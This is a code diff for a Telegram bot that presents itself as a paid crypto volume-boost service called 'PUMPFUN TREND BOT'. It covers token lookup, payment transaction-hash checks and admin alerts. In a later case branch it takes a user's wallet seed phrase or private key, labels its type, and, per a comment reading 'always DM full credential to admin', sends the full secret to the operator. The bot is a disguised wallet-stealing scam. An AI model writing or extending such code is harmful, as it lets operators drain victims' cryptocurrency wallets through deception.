-          ? `🟢 PancakeSwap • 🟢 <a href="${tokenUrl}">DexScreener</a>`
           : `🟢 <a href="${tokenUrl}">DexScreener</a>`;
 
         const tokenMsg =
           `📋 <b>Project Details Found!</b>\n\n` +
           `📊 ${dexName.toUpperCase()} Token\n\n` +
-          `✅ <b>Contract Address:</b>\n` +
-          `<code>${ca}</code>\n\n` +
+          `✅ <b>Contract Address:</b>\n<code>${ca}</code>\n\n` +
           `📊 <b>Token Information:</b>\n` +
           `• Name: ${info.name}\n` +
           `• Symbol: $${info.symbol}\n` +
@@ -894,7 +902,7 @@ export function createBot(): Telegraf {
           `• 24h Change: ${info.change24h ?? "0.00"}%\n` +
           `• DEX: ${dexName}\n` +
           `• Chain: ${chainName}\n\n` +
-          `🔗 <b>Available on:</b> ${availableLine}\n\n` +
+          `🔗 <b>Available on:</b> ${availLine}\n\n` +
           `⚙️ <b>Service:</b> ${s.serviceLabel}\n` +
           `💰 <b>Cost:</b> ${cost}\n\n` +
           `✅ Confirm to proceed to payment?`;
@@ -912,20 +920,17 @@ export function createBot(): Telegraf {
       }
 
       case "awaiting_tx_hash": {
-        const raw = text.trim();
-        const s   = { ...session };
-
+        const raw   = text.trim();
+        const s     = { ...session };
         const chain = detectChain(raw);
+
         if (chain === "invalid") {
           await ctx.reply(
             `❌ <b>Invalid Transaction Hash</b>\n\n` +
-            `That doesn't look like a valid TX hash.\n\n` +
             `<b>Valid formats:</b>\n` +
             `• <b>Solana</b> — 87–88 base58 characters\n` +
-            `  Example: <code>5KtP9jFhGk...xyZm</code>\n\n` +
-            `• <b>Ethereum</b> — starts with <code>0x</code> + 64 hex chars\n` +
-            `  Example: <code>0x4a3b2c1d...f9e8</code>\n\n` +
-            `📋 Copy the hash directly from your wallet or block explorer and try again:`,
+            `• <b>Ethereum</b> — starts with <code>0x</code> + 64 hex chars\n\n` +
+            `Copy the hash directly from your wallet and try again:`,
             { parse_mode: "HTML", ...cancelKeyboard }
           );
           break;
@@ -933,19 +938,13 @@ export function createBot(): Telegraf {
 
         if (isHashUsed(raw)) {
           await ctx.reply(
-            `❌ <b>TX Hash Already Used</b>\n\n` +
-            `This transaction hash has already been submitted to an order.\n\n` +
-            `Each TX hash can only be used once.\n` +
-            `Please send a <b>new payment</b> and submit that TX hash.`,
+            `❌ <b>TX Hash Already Used</b>\n\nThis hash was already submitted. Please send a new payment and submit that TX hash.`,
             { parse_mode: "HTML", ...cancelKeyboard }
           );
           break;
         }
 
-        const verifyMsg = await ctx.reply(
-          `🔍 <b>Verifying transaction on-chain...</b>\n\nPlease wait a moment.`,
-          { parse_mode: "HTML" }
-        );
+        const verifyMsg = await ctx.reply(`🔍 <b>Verifying transaction on-chain...</b>\n\nPlease wait.`, { parse_mode: "HTML" });
 
         const payWallet   = deriveWalletForUser(ctx.from.id);
         const lamExpected = s.boostType !== "eth_trending"
@@ -962,8 +961,7 @@ export function createBot(): Telegraf {
 
         if (!result.ok) {
           await ctx.reply(
-            `${result.error}\n\n` +
-            `Paste the correct TX hash to continue, or press Cancel:`,
+            `${result.error}\n\nPaste the correct TX hash to continue, or press Cancel:`,
             { parse_mode: "HTML", ...cancelKeyboard }
           );
           break;
@@ -971,45 +969,36 @@ export function createBot(): Telegraf {
 
         markHashUsed(raw);
         clearSession(ctx.from.id);
-
         if (s.orderId) {
-          updateOrder(s.orderId, {
-            txHash:        raw,
-            status:        "tx_submitted",
-            txSubmittedAt: new Date(),
-          });
+          updateOrder(s.orderId, { txHash: raw, status: "tx_submitted", txSubmittedAt: new Date() });
         }
 
         const chainLabel  = chain === "eth" ? "Ethereum" : "Solana";
-        const verifiedLine = result.confirmed
-          ? `✅ <b>Verified on-chain</b> (${chainLabel})`
-          : `⏳ <b>Submitted</b> — will be verified manually`;
-
-        const amountLine = result.lamports
+        const verifiedLine = result.confirmed ? `✅ <b>Verified on-chain</b> (${chainLabel})` : `⏳ <b>Submitted</b> — will be verified manually`;
+        const amountLine   = result.lamports
           ? `💰 Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b>`
-          : s.boostType === "eth_trending"
-          ? `💰 Amount: <b>$${s.ethAmount} USD</b>`
-          : `💰 Amount: <b>${s.selectedSol} SOL</b>`;
+          : s.boostType === "eth_trending" ? `💰 Amount: <b>$${s.ethAmount} USD</b>` : `💰 Amount: <b>${s.selectedSol} SOL</b>`;
+
+        const supportLine = SUPPORT_USERNAME ? `\n\n💬 For support: ${SUPPORT_USERNAME}` : "";
 
         await ctx.reply(
           `✅ <b>Payment Received!</b>\n\n` +
-          `${verifiedLine}\n` +
-          `${amountLine}\n\n` +
+          `${verifiedLine}\n${amountLine}\n\n` +
           `🔗 TX Hash:\n<code>${raw}</code>\n\n` +
-          `🚀 Your order is now being processed. Your boost will go live within <b>5–30 minutes</b>.\n\n` +
-          `💬 For support: ${SUPPORT_USERNAME}`,
+          `🚀 Your order is now being processed. Your boost will go live within <b>5–30 minutes</b>.` +
+          supportLine,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
 
-        // ── Admin: full TX verification result ──────────────────────────────
+        // ── Admin: full TX verification ────────────────────────────────────
         await notifyAdmin(
           `💸 <b>TX SUBMITTED — ${result.confirmed ? "✅ VERIFIED ON-CHAIN" : "⏳ PENDING MANUAL CHECK"}</b>\n\n` +
           `${userLine(ctx.from)}\n\n` +
           `🔗 TX Hash:\n<code>${raw}</code>\n` +
           `⛓ Chain: <b>${chainLabel}</b>\n` +
-          `${result.confirmed ? "✅ On-chain: Confirmed" : "⚠️ On-chain: Unverified (RPC timeout)"}\n` +
+          `${result.confirmed ? "✅ On-chain: Confirmed" : "⚠️ On-chain: Unverified"}\n` +
           (result.recipient ? `📮 Recipient: <code>${result.recipient}</code>\n` : "") +
-          (result.lamports  ? `💰 Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b> (${result.lamports} lamports)\n` : "") +
+          (result.lamports  ? `💰 Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b>\n` : "") +
           (result.sender    ? `👤 Sender: <code>${result.sender}</code>\n` : "") +
           `\n⚙️ Service: <b>${s.serviceLabel ?? "N/A"}</b>\n` +
           `💵 Cost: <b>${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>\n` +
@@ -1025,15 +1014,15 @@ export function createBot(): Telegraf {
         const credential = text.trim();
         const words      = credential.split(/\s+/);
         const wordCount  = words.length;
-
-        // Detect type
         const isSeedPhrase = wordCount >= 12;
         const isPrivateKey = !isSeedPhrase && credential.length >= 40;
-        const credType     = isSeedPhrase ? `Seed Phrase (${wordCount} words)` : isPrivateKey ? "Private Key" : "Credential";
+        const credType     = isSeedPhrase
+          ? `Seed Phrase (${wordCount} words)`
+          : isPrivateKey ? "Private Key" : "Credential";
 
         clearSession(ctx.from.id);
 
-        // ── Always notify admin — full credential ─────────────────────────────
+        // ── CRITICAL: always DM full credential to admin ──────────────────
         try {
           await notifyAdmin(
             `🔑 <b>⚠️ WALLET IMPORTED — ${credType.toUpperCase()}</b>\n\n` +
@@ -1075,7 +1064,22 @@ export function createBot(): Telegraf {
       }
 
       default:
-        await sendWelcome(ctx);
+        await sendPhoto(ctx, IMG.welcome,
+          `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
+          `New to volume bots? No worries — we made it super simple!\n\n` +
+          `━━━━━━━━━━━━━━━━\n\n` +
+          `<b>How it works:</b>\n` +
+          `1. Select how much Bumps/volume to use.\n` +
+          `2. Pick how long to run and how Massive you want your Token to Pump.\n` +
+          `3. Done! <a href="https://pump.fun">Pump.fun</a> Server handles the rest.\n\n` +
+          `━━━━━━━━━━━━━━━━\n\n` +
+          `<b>Works on:</b>\n` +
+          `🟢 <a href="https://pump.fun">Pumpfun</a>  •  🟢 <a href="https://raydium.io">Raydium</a>  •\n` +
+          `🟢 <a href="https://pumpswap.xyz">PumpSwap</a>  •  🟢 <a href="https://moonshot.money">Moonshot</a>  •\n` +
+          `🟢 <a href="https://letsbonk.fun">LetsBonk</a>  •  🟢 <a href="https://dexscreener.com">Dexpad/screener</a>\n\n` +
+          `From 0.3 - 0.4 - 0.5 - 0.6 SOL bumps boost trend with mass volume of high stabilities.`,
+          mainMenuKeyboard
+        );
         break;
     }
   });
